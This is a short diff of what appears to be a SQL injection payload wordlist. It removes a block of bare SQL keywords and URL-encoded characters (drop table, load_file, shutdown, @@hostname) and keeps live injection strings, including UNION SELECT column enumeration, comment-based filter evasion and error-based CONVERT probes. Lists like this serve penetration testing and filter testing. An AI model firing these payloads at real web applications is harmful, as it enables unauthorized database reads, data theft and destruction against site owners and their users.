@@ -174,57 +174,6 @@ AnD null UNiON SeLeCt 1,2,3,4,5,6,7,8,9,10,12,13,14+--+-
 And False Union Select 1,2,3,4,5,6,7,8,9,10,12,13,14+--+-
 database/*badd*//**/()
 database%23%0A(%23%0A)
-%27
-\x22
-%22
-char
-ascii
-%3B
-%2B
-%2D%2D
-%2F%2A
-%2A%2F
-substring
-drop table
-drop+table
-insert into
-insert+into
-version(
-values
-group by
-group+by
-create table
-create+table
-delete
-update
-bulk insert
-bulk+insert
-load_file
-shutdown
-union
-having
-select
-declare
-exec
-and
-or
-like
-@@hostname
-@@tmpdir
-is null
-is+null
-is not null
-is+not+null
-%3D
-CONCAT
-%40%40basedir
-version%28,user(
-user%28,system_user(
-(,%28,)
-%29
-@
-%40
-cast
 UNION ALL SELECT 'INJ'||'ECT'||'
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))
 UNION ALL SELECT NULL
